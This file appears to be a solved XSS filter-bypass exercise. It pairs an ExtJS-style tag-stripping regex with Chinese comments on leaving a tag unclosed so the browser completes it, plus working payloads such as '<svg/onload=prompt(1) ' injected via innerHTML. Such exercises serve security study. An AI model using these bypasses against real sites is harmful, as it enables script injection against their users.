@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+    <title></title>
+    <h1></h1>
+    <div id="body">
+    </div>
+    <script>
+        // 缺點?
+        function escape(input) {
+            // tags stripping mechanism from ExtJS library
+            // Ext.util.Format.stripTags
+            //正則表達式過濾了兩個括號裏的内容,思路:右括號不閉合
+            // 瀏覽器會有自動補全的機制,右邊括號會自動補齊
+            var stripTagsRE = /<\/?[^>]+>/gi;
+            input = input.replace(stripTagsRE, '');
+
+            return '<article>' + input + '</article>';
+        } 
+        // var input="<img src='#' style='display: none;'   onerror=alert(/xss/);  ";
+        var input="<svg/onload=prompt(1) ";
+        var body=document.getElementById("body");
+        body.innerHTML=escape(input);
+    </script>
+</body>
+
+</html>
